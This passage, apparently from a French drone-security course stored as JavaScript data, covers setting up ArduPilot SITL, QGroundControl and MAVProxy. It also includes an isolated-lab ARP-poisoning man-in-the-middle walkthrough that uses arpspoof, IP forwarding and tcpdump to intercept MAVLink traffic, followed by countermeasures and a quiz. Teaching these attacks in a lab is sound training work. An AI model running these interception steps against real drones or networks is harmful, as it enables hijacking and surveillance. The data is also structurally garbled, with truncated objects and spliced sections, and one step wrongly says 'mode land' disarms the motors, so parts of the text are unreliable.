      body:{fr:"Fichier → Gestionnaire de réseau hôte → Créer. Onglet <em>Adaptateur</em> : IP <code>192.168.56.1</code>, masque <code>255.255.255.0</code>. Onglet <em>Serveur DHCP</em> : <strong>désactivez</strong> le DHCP — on attribuera des IPs fixes dans chaque VM."}},
    {t:"table",
      head:[{fr:"Machine"},{fr:"IP"},{fr:"Rôle"}],
      rows:[
        [{fr:"Hôte VirtualBox"},'<span class="mono">192.168.56.1</span>',{fr:"Observation / Wireshark"}],
        [{fr:"VM 1 — Ubuntu (ArduPilot SITL)"},'<span class="mono">192.168.56.101</span>',{fr:"Drone simulé"}],
        [{fr:"VM 2 — Ubuntu (QGroundControl)"},'<span class="mono">192.168.56.102</span>',{fr:"Station de contrôle (GCS)"}],
        [{fr:"VM 3 — Kali Linux"},'<span class="mono">192.168.56.3</span>',{fr:"Attaquant MITM"}]
      ]},

    /* ---- Create VMs ---- */
    {t:"html", tx:{fr:'<div id="anchor-vbox-vms"></div>'}},
    {t:"h", num:"03", tx:{fr:"Créer les trois VMs"}},
    {t:"p", tx:{fr:"Chaque VM a <strong>deux cartes réseau</strong> : Adaptateur 1 = NAT (accès Internet pour l'installation initiale) · Adaptateur 2 = Host-Only (réseau lab isolé 192.168.56.x)."}},

    {t:"h2", tx:{fr:"VM 1 — Ubuntu 22.04 (ArduPilot SITL)"}},
    {t:"cards", items:[
      {tt:{fr:"Créer la VM"}, bd:{fr:"Nouveau → Nom : <strong>Drone-SITL</strong> → Type Ubuntu 64-bit → RAM 2048 Mo → Disque 20 Go (VDI dynamique). Montez l'ISO Ubuntu 22.04 LTS."}},
      {tt:{fr:"Réseau"}, bd:{fr:"Paramètres → Réseau : Adaptateur 1 = <strong>NAT</strong> · Adaptateur 2 = <strong>Réseau hôte seulement</strong> (vboxnet0 / Host-Only Adapter). Les deux activés."}},
      {tt:{fr:"Post-install"}, bd:{fr:"Installez Ubuntu, puis suivez le module 02 pour déployer ArduPilot SITL. Configurez l'IP fixe <code>192.168.56.101</code> sur l'interface Host-Only."}}
    ]},
    {t:"cmd", step:"3.1", name:{fr:"Fixer l'IP de VM 1"},
      cmd:"sudo ip addr add 192.168.56.101/24 dev enp0s8\nsudo ip link set enp0s8 up",
      exp:{fr:"L'interface Host-Only est généralement <code>enp0s8</code> (2ᵉ carte). Identifiez-la avec <code>ip link show</code>. Pour la rendre permanente : éditez <code>/etc/netplan/01-netcfg.yaml</code>."}},

    {t:"h2", tx:{fr:"VM 2 — Ubuntu 22.04 (QGroundControl)"}},
    {t:"cmd", step:"3.2", name:{fr:"Fixer l'IP de VM 2"},
      cmd:"sudo ip addr add 192.168.56.102/24 dev enp0s8\nsudo ip link set enp0s8 up",
      exp:{fr:"Même procédure avec l'IP <code>192.168.56.102</code>. Téléchargez QGroundControl AppImage depuis qgroundcontrol.com et rendez-le exécutable : <code>chmod +x QGroundControl.AppImage</code>."}},

    {t:"h2", tx:{fr:"VM 3 — Kali Linux (Attaquant)"}},
    {t:"cards", items:[
      {tt:{fr:"Image Kali OVA"}, bd:{fr:"Téléchargez l'image officielle <code>.ova</code> sur kali.org → Virtual Machines → VirtualBox. Importez via Fichier → Importer un appareil virtuel."}},
      {tt:{fr:"Ajouter Host-Only"}, bd:{fr:"Paramètres → Réseau → Adaptateur 2 → Activer → Réseau hôte seulement (vboxnet0). L'adaptateur 1 reste en NAT pour les mises à jour Kali."}},
      {tt:{fr:"Outils inclus"}, bd:{fr:"<code>arpspoof</code> (paquet dsniff), <code>tcpdump</code>, <code>tshark</code>, <code>wireshark</code> — tous préinstallés dans Kali. Vérifiez : <code>which arpspoof</code>."}}
    ]},
    {t:"cmd", step:"3.3", name:{fr:"Fixer l'IP de VM 3 (Kali)"},
      cmd:"sudo ip addr add 192.168.56.3/24 dev eth1\nsudo ip link set eth1 up",
      exp:{fr:"Sur Kali, l'interface Host-Only s'appelle souvent <code>eth1</code> ou <code>enp0s8</code>. Identifiez-la avec <code>ip link show</code>."}},
    {t:"cmd", step:"3.4", name:{fr:"Tester la connectivité entre les VMs"},
      cmd:"ping -c 3 192.168.56.101   # Kali → drone\nping -c 3 192.168.56.102   # Kali → GCS",
      exp:{fr:"Tous les pings doivent répondre. Si un ping échoue : vérifiez que l'interface Host-Only est bien <em>up</em> et dans le bon sous-réseau sur chaque VM."}},

    /* ---- Full MITM ---- */
    {t:"html", tx:{fr:'<div id="anchor-mitm-full"></div>'}},
    {t:"h", num:"04", tx:{fr:"Attaque Man-in-the-Middle complète — ARP Poisoning"}},
    {t:"attack", label:{fr:"Scénario Bonus"}, title:{fr:"MITM par ARP Poisoning sur réseau Host-Only VirtualBox"},
      desc:{fr:"Kali empoisonne simultanément les tables ARP de VM1 (drone) et VM2 (GCS). Chaque machine croit que l'autre est à l'adresse MAC de Kali. Tout le trafic MAVLink transite désormais par Kali : il peut le lire, le modifier et l'enregistrer en temps réel."}},

    {t:"h2", tx:{fr:"Étape 0 — Démarrer la communication normale (pré-attaque)"}},
    {t:"cmd", step:"4.1", name:{fr:"VM 1 — Lancer SITL vers la GCS"},
      cmd:"sim_vehicle.py -v ArduCopter --console --map --out=udp:192.168.56.102:14550",
      exp:{fr:"SITL démarre et envoie sa télémétrie directement vers QGroundControl sur VM2. Vérifiez dans QGC que la connexion s'établit avant l'attaque."}},
    {t:"cmd", step:"4.2", name:{fr:"VM 2 — Ouvrir QGroundControl"},
      cmd:"./QGroundControl.AppImage",
      exp:{fr:"QGC se connecte automatiquement sur UDP 14550. Notez la position GPS, l'altitude et le mode de vol — vous vérifierez que ces données sont visibles dans la capture Kali."}},

    {t:"h2", tx:{fr:"Lancer l'attaque depuis Kali (VM 3) — 3 terminaux simultanés"}},
    {t:"cmd", step:"4.3", name:{fr:"Terminal 1 — Activer le routage IP"},
      cmd:"echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward",
      exp:{fr:"Sans cette commande, Kali absorbe les paquets mais ne les retransmet pas → la liaison coupe et l'attaque est détectable. Avec le forwarding, le trafic est relayé de façon transparente."}},
    {t:"cmd", step:"4.4", name:{fr:"Terminal 2 — Empoisonner VM 1 (drone)"},
      cmd:"sudo arpspoof -i eth1 -t 192.168.56.101 192.168.56.102",
      exp:{fr:"Envoie en continu des ARP Reply à VM1 : « l'IP <code>192.168.56.102</code> (GCS) est à l'adresse MAC de Kali ». VM1 croit que Kali est la GCS."}},
    {t:"cmd", step:"4.5", name:{fr:"Terminal 3 — Empoisonner VM 2 (GCS)"},
      cmd:"sudo arpspoof -i eth1 -t 192.168.56.102 192.168.56.101",
      exp:{fr:"Symétrique : dit à VM2 « le drone est à l'adresse MAC de Kali ». Kali est maintenant intercalé entre les deux flux — il voit et peut modifier tous les échanges MAVLink."}},
    {t:"out", label:{fr:"Table ARP de VM1 — avant / après empoisonnement"},
      lines:{fr:'<span class="ok">arp -n</span> sur VM1 :<br><span class="dim">Avant :</span>  192.168.56.102  <span class="ok">aa:bb:cc:dd:ee:ff</span>  <span class="dim"># vraie MAC de VM2 (GCS)</span><br><span class="dim">Après :</span>  192.168.56.102  <span class="warn">11:22:33:44:55:66</span>  <span class="dim"># MAC de Kali ← poisonnée</span>'}},
    {t:"cmd", step:"4.6", name:{fr:"Capturer le trafic intercepté"},
      cmd:"sudo tcpdump -i eth1 -X 'udp port 14550' -w /tmp/mavlink_mitm.pcap",
      exp:{fr:"Enregistre chaque paquet MAVLink (UDP 14550) qui transite par Kali. La capture contient la totalité des échanges drone ↔ GCS."}},
    {t:"cmd", step:"4.7", name:{fr:"Décoder avec pymavlink"},
      cmd:"python3 -c \"\nfrom pymavlink import mavutil\nm = mavutil.mavlink_connection('/tmp/mavlink_mitm.pcap', notimestamps=True)\nwhile True:\n    msg = m.recv_match(blocking=False)\n    if msg is None: break\n    print(msg)\n\"",
      exp:{fr:"Rejoue le pcap et affiche chaque message MAVLink décodé : type, valeurs de champs, sysid/compid. Position GPS, altitude, batterie — tout est en clair."}},
    {t:"alert", kind:"danger", title:{fr:"Données critiques exposées en clair"},
      body:{fr:"Le décodage révèle : position GPS à chaque seconde, altitude MSL, vitesse, cap magnétique, état batterie, mode de vol, waypoints de mission. <strong>Chaque commande vers le drone pourrait être modifiée avant retransmission</strong> : ARM, DISARM, SET_MODE, MISSION_ITEM."}},
    {t:"alert", kind:"warn", title:{fr:"Arrêter l'attaque proprement"},
      body:{fr:"Ctrl+C sur les deux terminaux <code>arpspoof</code>. Les tables ARP se corrigent automatiquement en quelques secondes. Désactivez le routage : <code>echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward</code>."}},
    {t:"alert", kind:"info", title:{fr:"Contre-mesures MITM"},
      body:{fr:"<ul><li><strong>Détection ARP</strong> — <code>arpwatch</code> ou <code>XArp</code> alertent sur les Gratuitous ARP suspects.</li><li><strong>ARP statique</strong> — entrées permanentes (<code>arp -s IP MAC</code>) résistant à l'empoisonnement.</li><li><strong>Chiffrement E2E</strong> — tunnel WireGuard ou TLS : même interceptées, les trames sont illisibles.</li><li><strong>Signature MAVLink v2</strong> — les commandes modifiées sont rejetées si non signées avec la clé secrète.</li></ul>"}}
  ],
  quiz:[
    {q:{fr:"Pourquoi faut-il activer ip_forward sur Kali avant l'ARP poisoning ?"},
     a:{fr:"Sans <code>ip_forward</code>, Kali reçoit les paquets mais ne les retransmet pas : la liaison coupe et l'attaque est immédiatement visible. Avec le forwarding, les paquets sont relayés de façon transparente — les victimes ne voient aucune coupure."}},
    {q:{fr:"Quelle différence entre un réseau Host-Only et un réseau NAT dans VirtualBox ?"},
     a:{fr:"Le réseau <b>Host-Only</b> est totalement isolé d'Internet : parfait pour un lab offensif. Le réseau <b>NAT</b> partage la connexion Internet de l'hôte mais ne permet pas l'adressage fixe inter-VMs ni l'accès direct entre VMs."}},
    {q:{fr:"Qu'est-ce qu'un Gratuitous ARP et comment le détecter ?"},
     a:{fr:"Un <b>Gratuitous ARP</b> est un ARP Reply non sollicité : signature classique d'un empoisonnement. Dans Wireshark, filtrez <code>arp.opcode == 2</code> et cherchez deux IP différentes partageant la même adresse MAC."}}
  ],
  exercise:null,
  flag:"FLAG{MITM-VBOX-LAB}"
}

    /* ===== SITL (shared, labelled per track) ===== */
    {t:"html", tx:'<div id="anchor-sitl"></div>'},
    {t:"h", num:"01", tx:{fr:"Installer ArduPilot SITL"}},
    {t:"alert", os:"windows", kind:"warn", title:{fr:"Où taper ces commandes ?"},

    {t:"p", tx:{fr:"ArduPilot SITL (<strong>Software In The Loop</strong>) simule un drone complet : le firmware réel tourne sur la machine, les capteurs sont simulés, et la station au sol s'y connecte comme à un vrai drone."}},
    {t:"cmd", step:"1.1", name:{fr:"Mettre à jour le système"}, cmd:"sudo apt update && sudo apt upgrade",

    {t:"cmd", step:"1.2", name:{fr:"Installer les dépendances"}, cmd:"sudo apt install git python3 python3-pip python3-dev build-essential wget curl",

    {t:"cmd", step:"1.3", name:{fr:"Cloner le dépôt ArduPilot"}, cmd:"git clone https://github.com/ArduPilot/ardupilot.git",
      exp:{fr:"Récupère le code source officiel d'ArduPilot (firmware + outils de simulation)."}},
    {t:"cmd", step:"1.4", name:{fr:"Entrer dans le dossier"}, cmd:"cd ardupilot",
      exp:{fr:"Se place dans le dépôt cloné ; les commandes suivantes partent de cette racine."}},
    {t:"cmd", step:"1.5", name:{fr:"Installer les pré-requis ArduPilot"}, cmd:"Tools/environment_install/install-prereqs-ubuntu.sh -y",
      exp:{fr:"Script officiel qui installe automatiquement les bibliothèques et modules Python attendus par SITL."}},
    {t:"cmd", step:"1.6", name:{fr:"Recharger l'environnement"}, cmd:". ~/.profile",
      exp:{fr:"Recharge les variables d'environnement ajoutées par le script, sans rouvrir le terminal."}},
    {t:"cmd", step:"1.7", name:{fr:"Configurer la cible SITL"}, cmd:"./waf configure --board sitl",
      exp:{fr:"Indique au système de build de compiler pour la carte virtuelle <code>sitl</code>."}},
    {t:"cmd", step:"1.8", name:{fr:"Compiler le firmware"}, cmd:"./waf copter",
      exp:{fr:"Compile le firmware ArduCopter pour SITL. La première compilation prend plusieurs minutes."}},
    /* launch - per track */
    {t:"cmd", os:"windows", step:"1.9", name:{fr:"Récupérer l'IP de l'hôte Windows"},
      cmd:"WSL_IP=$(ip route show | grep default | awk '{print $3}')",
      exp:{fr:"Depuis Ubuntu (WSL), récupère l'IP de Windows. QGroundControl tournant sous Windows, le SITL devra lui envoyer la télémétrie à cette adresse."}},
    {t:"cmd", os:"windows", step:"1.10", name:{fr:"Lancer SITL vers QGC (Windows)"},
      cmd:"cd ~/ardupilot/ArduCopter && ../Tools/autotest/sim_vehicle.py -v ArduCopter -f quad --map --out=udp:$WSL_IP:14550",
      exp:{fr:"<code>--out=udp:$WSL_IP:14550</code> redirige la télémétrie vers QGroundControl sur Windows. QGC détecte alors le drone simulé."}},
    {t:"result", os:"windows", label:{fr:"SITL en cours d'exécution"}, src:"images/win1.png",
      cap:{fr:"ArduPilot SITL lancé dans WSL, connecté à QGroundControl Windows."}},
    {t:"alert", os:"windows", kind:"warn", title:{fr:"Warning: time moved backwards"},
      body:{fr:"Si la console SITL affiche <em>Warning, time moved backwards. Restarting timer.</em>, c'est normal sous WSL 2 : l'horloge WSL peut dériver légèrement. Ce message n'affecte pas le fonctionnement du simulateur."}},
    {t:"cmd", os:"linux", step:"1.9", name:{fr:"Lancer le simulateur"},
      cmd:"cd ~/ardupilot/ArduCopter && ../Tools/autotest/sim_vehicle.py -v ArduCopter -f quad --console --map",
      exp:{fr:"Démarre un quadricoptère simulé. Le SITL expose MAVLink en UDP sur <code>14550</code>, accessible en local par QGroundControl."}},
    {t:"result", label:{fr:"SITL en cours d'exécution"}, src:"images/img1.png",
      cap:{fr:"ArduPilot SITL lancé avec la console et la carte."}},

    /* ===== QGC linux ===== */
    {t:"html", os:"linux", tx:'<div id="anchor-qgc"></div>'},
    {t:"h", os:"linux", num:"02", tx:{fr:"Installer QGroundControl (Ubuntu)"}},
    {t:"p", os:"linux", tx:{fr:"QGroundControl est la station de contrôle au sol. Sous Ubuntu, elle se distribue en AppImage et se connecte au SITL via UDP sur <code>127.0.0.1:14550</code>."}},
    {t:"cmd", os:"linux", step:"2.1", name:{fr:"Autoriser l'accès au port série"}, cmd:"sudo usermod -a -G dialout $USER",
      exp:{fr:"Ajoute votre utilisateur au groupe <code>dialout</code>. Déconnexion/reconnexion nécessaire."}},
    {t:"cmd", os:"linux", step:"2.2", name:{fr:"Installer les dépendances"}, cmd:"sudo apt install gstreamer1.0-plugins-bad gstreamer1.0-libav gstreamer1.0-gl libfuse2 -y",
      exp:{fr:"GStreamer gère la vidéo ; <code>libfuse2</code> permet d'exécuter l'AppImage."}},
    {t:"cmd", os:"linux", step:"2.2w", name:{fr:"Télécharger QGroundControl (AppImage)"},
      cmd:"wget https://d176tv9ibo4jno.cloudfront.net/latest/QGroundControl-x86_64.AppImage",
      exp:{fr:"Télécharge directement la dernière version stable de QGroundControl pour Linux (x86-64). Le fichier fait environ 200 Mo."}},
    {t:"cmd", os:"linux", step:"2.3", name:{fr:"Rendre l'AppImage exécutable"}, cmd:"chmod +x ./QGroundControl-x86_64.AppImage",
      exp:{fr:"Donne le droit d'exécution à l'AppImage téléchargée."}},
    {t:"cmd", os:"linux", step:"2.4", name:{fr:"Lancer QGroundControl"}, cmd:"./QGroundControl-x86_64.AppImage",
      exp:{fr:"Démarre la station. Une liaison UDP sur <code>14550</code> détecte automatiquement le SITL local."}},
    {t:"result", os:"linux", label:{fr:"QGC connecté"}, src:"images/img2.png",
      cap:{fr:"QGroundControl connecté au simulateur."}},

    /* ---- Contrôle du drone depuis QGroundControl ---- */
    {t:"h2", os:"linux", tx:{fr:"Contrôler le drone depuis QGroundControl"}},
    {t:"p", os:"linux", tx:{fr:"Une fois QGC connecté au SITL, vous pouvez piloter le drone simulé directement depuis l'interface. Voici les étapes de base : démarrage, décollage, navigation vers un point."}},
    {t:"alert", os:"linux", kind:"info", title:{fr:"Prérequis"},
      body:{fr:"SITL doit être en cours d'exécution dans un terminal et QGC doit afficher <strong>Connected</strong> en haut à gauche. Le drone apparaît sur la carte."}},
    {t:"h2", os:"linux", tx:{fr:"Étape 1 — Passer en mode GUIDED"}},
    {t:"p", os:"linux", tx:{fr:"Le mode <strong>GUIDED</strong> permet de donner des commandes de navigation au drone en temps réel (décollage, waypoints, atterrissage). Il faut d'abord l'activer depuis MAVProxy dans le terminal."}},
    {t:"cmd", os:"linux", pfx:"MAVProxy> ", step:"2.5", name:{fr:"Activer le mode GUIDED"},
      cmd:"mode GUIDED",
      exp:{fr:"Bascule le drone simulé en mode GUIDED. QGC l'indique en haut de l'écran : <code>GUIDED</code> apparaît dans la barre de statut. Le drone est maintenant prêt à recevoir des commandes de navigation."}},
    {t:"h2", os:"linux", tx:{fr:"Étape 2 — Décoller depuis QGroundControl"}},
    {t:"p", os:"linux", tx:{fr:"Une fois le mode GUIDED activé, le décollage se fait directement depuis l'interface QGC."}},
    {t:"alert", os:"linux", kind:"tip", title:{fr:"Décollage depuis QGC"},
      body:{fr:"<ol style='margin:0;padding-left:1.4em;line-height:2'><li>Dans la vue <strong>Fly</strong>, cliquez sur l'icône <strong>Takeoff</strong> (flèche vers le haut) dans la barre d'actions à gauche.</li><li>Un curseur de confirmation apparaît, faites-le glisser vers la droite pour confirmer.</li><li>QGC arme automatiquement les moteurs et commande le décollage. Vous pouvez ajuster l'altitude cible avant de confirmer.</li></ol>"}},
    {t:"result", os:"linux", label:{fr:"Bouton Takeoff dans QGroundControl"}, src:"images/win3.png",
      cap:{fr:"Barre d'actions QGC, icône Takeoff puis curseur de confirmation."}},
    {t:"h2", os:"linux", tx:{fr:"Étape 3 — Naviguer vers une position"}},
    {t:"p", os:"linux", tx:{fr:"Depuis QGroundControl, faites un <strong>clic</strong> sur n'importe quel point de la carte, puis sélectionnez <em>Go to location</em>. Le drone se déplace vers ce point en maintenant son altitude."}},
    {t:"result", os:"linux", label:{fr:"Navigation en mode GUIDED"}, src:"images/win4.png",
      cap:{fr:"Le drone suit la position cliquée sur la carte."}},

    /* ===== QGC windows ===== */
    {t:"html", os:"windows", tx:'<div id="anchor-qgcwin"></div>'},
    {t:"h", os:"windows", num:"02", tx:{fr:"Installer QGroundControl (Windows)"}},
    {t:"p", os:"windows", tx:{fr:"Sous Windows, QGroundControl s'installe comme un programme classique (<code>.exe</code>) ; <strong>pas</strong> dans WSL. Il se connecte au SITL qui tourne dans Ubuntu (WSL)."}},

      cmd:"start https://d176tv9ibo4jno.cloudfront.net/latest/QGroundControl-installer.exe",
      exp:{fr:"Ouvre directement le téléchargement de l'installeur Windows (<code>.exe</code>, ≈ 200 Mo). Une fois téléchargé, exécutez-le normalement sur windows"}},
    {t:"result", os:"windows", label:{fr:"QGC connecté"}, src:"images/win2.png",
      cap:{fr:"QGroundControl (Windows) connecté au SITL qui tourne dans WSL."}},

    /* ---- Contrôle du drone depuis QGroundControl (Windows) ---- */
    {t:"h2", os:"windows", tx:{fr:"Contrôler le drone depuis QGroundControl"}},
    {t:"p", os:"windows", tx:{fr:"Une fois QGC connecté au SITL, vous pouvez piloter le drone simulé directement depuis l'interface. Voici les étapes de base : démarrage, décollage, navigation vers un point."}},
    {t:"alert", os:"windows", kind:"info", title:{fr:"Prérequis"},

    /* ===== MAVProxy (shared, console) ===== */
    {t:"html", tx:'<div id="anchor-mavproxy"></div>'},
    {t:"h", num:"03", tx:{fr:"MAVProxy"}},
    {t:"p", tx:{fr:"MAVProxy est un proxy MAVLink en ligne de commande. Toutes les commandes ci-dessous se tapent dans <strong>la console MAVProxy</strong> (fenêtre ouverte avec le SITL), pas dans un terminal système."}},

    {t:"h2", tx:{fr:"Surveiller les messages"}},
    {t:"cmd", pfx:"> ", step:"3.1", name:{fr:"Heartbeat — état du système"},
      cmd:"watch HEARTBEAT",
      exp:{fr:"Affiche le « pouls » à 1 Hz : type de véhicule, base mode, état de l'armement."}},
    {t:"cmd", pfx:"> ", step:"3.2", name:{fr:"Position GPS brute"},
      cmd:"watch GPS_RAW_INT",
      exp:{fr:"Latitude / longitude (×10⁷), altitude, précision et nombre de satellites. C'est cette valeur qu'on falsifie lors de l'attaque GPS spoofing (module 04)."}},
    {t:"cmd", pfx:"> ", step:"3.3", name:{fr:"Vitesse, cap et altitude"},
      cmd:"watch VFR_HUD",
      exp:{fr:"Affichage : airspeed, groundspeed, heading, throttle, altitude et climb rate."}},
    {t:"cmd", pfx:"> ", step:"3.4", name:{fr:"Attitude"},
      cmd:"watch ATTITUDE",
      exp:{fr:"Angles roll / pitch / yaw en radians et leurs vitesses angulaires. Utile pour diagnostiquer une instabilité."}},
    {t:"result", label:{fr:"Messages MAVLink en temps réel"}, imgs:[{src:"images/img4.png"},{src:"images/img5.png"}],
      cap:{fr:"HEARTBEAT et GPS_RAW_INT capturés dans la console MAVProxy."}},
    {t:"alert", kind:"warn", title:{fr:"Limitation MAVProxy"},
      body:{fr:"C'est une limitation connue de MAVProxy : l'affichage des messages bruts MAVLink ne peut pas être désactivé une fois lancé. Pour arrêter le flux, il faut quitter MAVProxy et le relancer."}},
    {t:"h2", tx:{fr:"Modes de vol"}},
    {t:"table",
      head:["Commande","Mode","Comportement"],
      rows:[
        ["<code>mode GUIDED</code>","GUIDED","Contrôle direct par destination GPS — requis avant toute commande <code>guided</code>."],
        ["<code>mode LOITER</code>","LOITER","Le drone maintient sa position GPS actuelle, sans intervention."],
        ["<code>mode AUTO</code>","AUTO","Exécution autonome d'un plan de mission (waypoints chargés)."],
        ["<code>mode RTL</code>","RTL","Return-To-Launch : retour automatique au point de décollage."],
        ["<code>mode LAND</code>","LAND","Atterrissage vertical à la position actuelle."],
        ["<code>mode STABILIZE</code>","STABILIZE","Stabilisation manuelle — le pilote contrôle directement les rotors."]
      ]},
    {t:"cmd", pfx:"> ", step:"3.5", name:{fr:"Passer en mode GUIDED"},
      cmd:"mode GUIDED",
      exp:{fr:"Prérequis pour les commandes <code>takeoff</code> et <code>guided</code>. Sans ce mode, le drone ignore les ordres de navigation manuelle."}},

    {t:"h2", tx:{fr:"Armement et décollage"}},
    {t:"cmd", pfx:"> ", step:"3.6", name:{fr:"Armer et décoller"},
      cmd:"arm throttle\ntakeoff 20",
      exp:{fr:"<code>arm throttle</code> arme les moteurs. <code>takeoff 20</code> déclenche le décollage jusqu'à 20 m. Vous pouvez remplacer 20 par l'altitude souhaitée."}},
    {t:"cmd", pfx:"> ", step:"3.7", name:{fr:"Désarmer les moteurs"},
      cmd:"mode land",
      exp:{fr:"Désarme les moteurs."}},

    {t:"h2", tx:{fr:"Navigation et altitude"}},
    {t:"p", tx:{fr:"Vous pouvez envoyer un waypoint directement en ligne de commande avec <code>guided &lt;lat&gt; &lt;lon&gt; &lt;alt&gt;</code>."}},
    {t:"cmd", pfx:"> ", step:"3.8", name:{fr:"Voler vers une position GPS"},
      cmd:"guided 48.8566 2.3522 50",
      exp:{fr:"Envoie le drone vers Paris (lat=48.8566, lon=2.3522) à 50 m d'altitude."}},

    {t:"h2", tx:{fr:"Paramètres"}},
    {t:"p", tx:{fr:"<code>param show</code> liste tous les paramètres ArduPilot avec leur valeur courante (~700 entrées). Ajoutez un filtre pour cibler une catégorie."}},
    {t:"cmd", pfx:"> ", step:"3.9", name:{fr:"Afficher tous les paramètres"},
      cmd:"param show",
      exp:{fr:"Déverse l'intégralité de la configuration du contrôleur. Utile pour explorer ce qui est modifiable."}},
    {t:"out", label:{fr:"Extrait"},
      lines:{fr:"<pre>ACRO_BAL_PITCH   1.0\nACRO_BAL_ROLL    1.0\nARMING_RUDDER    2\nARMING_SKIPCHK   0\nBATT_LOW_VOLT    10.5\nBATT_CAPACITY    3300\nGPS1_TYPE        1\nGPS_AUTO_SWITCH  1\nGPS_NAVFILTER    8\nLOIT_SPEED_MS    12.5\nPILOT_SPD_UP     2.5\n... </pre>"}},
    {t:"cmd", pfx:"> ", step:"3.10", name:{fr:"Filtrer les paramètres GPS"},
      cmd:"param show GPS*",
      exp:{fr:"N'affiche que les paramètres commençant par <code>GPS</code>. Même syntaxe pour d'autres catégories : <code>WP*</code>, <code>BATT*</code>, <code>LOIT*</code>, <code>ARMING*</code>."}},
    {t:"out", label:{fr:"Résultat — param show GPS*"},
      lines:{fr:"<pre>GPS1_CAN_NODEID  0\nGPS1_COM_PORT    1\nGPS1_GNSS_MODE   0\nGPS1_POS_X       0.0\nGPS1_POS_Y       0.0\nGPS1_POS_Z       0.0\nGPS1_RATE_MS     200\nGPS1_TYPE        1\nGPS2_TYPE        0\nGPS_AUTO_CONFIG  1\nGPS_AUTO_SWITCH  1\nGPS_HDOP_GOOD    140\nGPS_NAVFILTER    8\nGPS_PRIMARY      0\nGPS_SBAS_MODE    2</pre>"}},
    {t:"table",
      head:["Paramètre","Valeur actuelle","Rôle"],
      rows:[
        ["<code>GPS1_TYPE</code>","1","Type de GPS : 1 = uBlox, 0 = désactivé"],
        ["<code>GPS1_GNSS_MODE</code>","0","Constellations autorisées (0 = auto, 1 = GPS seul, 3 = GPS+GLONASS)"],
        ["<code>GPS1_POS_X/Y/Z</code>","0.0","Offset de l'antenne GPS par rapport au centre de drone (en mètres)"],
        ["<code>GPS1_RATE_MS</code>","200","Fréquence d'actualisation GPS en ms (200 = 5 Hz)"],
        ["<code>GPS_HDOP_GOOD</code>","140","Seuil HDOP en dessous duquel le GPS est considéré précis (×100)"],
        ["<code>GPS_AUTO_SWITCH</code>","1","Bascule automatique vers le meilleur GPS disponible"],
        ["<code>GPS_NAVFILTER</code>","8","Filtre de navigation interne du module GPS"]
      ]},
    {t:"cmd", pfx:"> ", step:"3.11", name:{fr:"Décaler la position GPS"},
      cmd:"param set GPS1_POS_X 10.0",
      exp:{fr:"Déclare que l'antenne GPS est 10 m en avant du centre de drone. L'EKF applique cette correction : la position affichée sur la carte MAVProxy se décale de ~10 m vers l'avant."}},
    {t:"alert", kind:"info", title:{fr:"Réinitialiser l'offset"},
      body:{fr:"<code>param set GPS1_POS_X 0.0</code> remet l'antenne au centre de masse, le drone revient à sa position réelle sur la carte."}},

    /* ===== Mission ===== */
    {t:"html", tx:'<div id="anchor-mission"></div>'},
    {t:"h", num:"04", tx:{fr:"Définir et lancer une mission"}},
    {t:"p", tx:{fr:"La méthode la plus directe : dessiner la mission à la souris directement dans la fenêtre MAP."}},
    {t:"cmd", pfx:"MAP ", step:"4.1", name:{fr:"Activer le mode dessin"},
      cmd:"Clic droit → Mission | Draw",
      exp:{fr:"Active le tracé de mission dans la fenêtre MAP."}},
    {t:"cmd", pfx:"MAP ", step:"4.2", name:{fr:"Placer les waypoints"},
      cmd:"Clic gauche  (autant de fois que souhaité)",
      exp:{fr:"Chaque clic sur la carte ajoute un waypoint. Les points sont reliés dans l'ordre de clic."}},
    {t:"cmd", pfx:"MAP ", step:"4.3", name:{fr:"Terminer la mission"},
      cmd:"Clic droit → Mission | Stop  (ou Loop)",
      exp:{fr:"<strong>Stop</strong> : le drone s'arrête après le dernier waypoint. <strong>Loop</strong> : la mission se répète en boucle indéfiniment."}},
    {t:"cmd", pfx:"> ", step:"4.4", name:{fr:"Vérifier, basculer en AUTO et démarrer"},
      cmd:"wp list\nmode AUTO\narm throttle",
      exp:{fr:"<code>wp list</code> confirme les waypoints chargés. <code>mode AUTO</code> passe en mode mission autonome. <code>arm throttle</code> arme les moteurs et déclenche la mission."}},
    {t:"result", label:{fr:"Mission suivie sur la carte"}, imgs:[{src:"images/img9.png"},{src:"images/img11.png"}],
      cap:{fr:"Chargement et exécution de la mission sur la carte."}},

    /* ===== Wireshark (shared) ===== */
    {t:"html", tx:'<div id="anchor-wireshark"></div>'},
    {t:"h", num:"05", tx:{fr:"Capturer MAVLink avec Wireshark"}},
    {t:"cmd", step:"5.1", name:{fr:"Installer Wireshark"}, cmd:"sudo apt install wireshark"},
    {t:"cmd", step:"5.2", name:{fr:"Rejoindre le groupe wireshark"}, cmd:"sudo usermod -aG wireshark $USER",
      exp:{fr:"Permet de capturer sans <code>sudo</code> à chaque fois."}},
    {t:"cmd", step:"5.3", name:{fr:"Ouvrir Wireshark"}, cmd:"wireshark &",
      exp:{fr:"Choisir l'interface <code>lo</code>."}},
    {t:"p", tx:{fr:"Wireshark capture le trafic UDP entre le SITL et la GCS. Par défaut il ne reconnaît pas MAVLink : on lui ajoute un <em>dissector</em> en Lua. Ce plugin apprend à Wireshark à décoder les identifiants numériques MAVLink (0, 1, 24…) en noms lisibles (<code>HEARTBEAT</code>, <code>SYS_STATUS</code>, <code>GPS_RAW_INT</code>…)."}},
    {t:"cmd", step:"5.4", name:{fr:"Créer le dossier de plugins"}, cmd:"mkdir -p ~/.local/lib/wireshark/plugins",
      exp:{fr:"Dossier où Wireshark charge automatiquement les dissectors personnels."}},
    {t:"cmd", pfx:"", name:{fr:"~/gen_mavlink.py"},
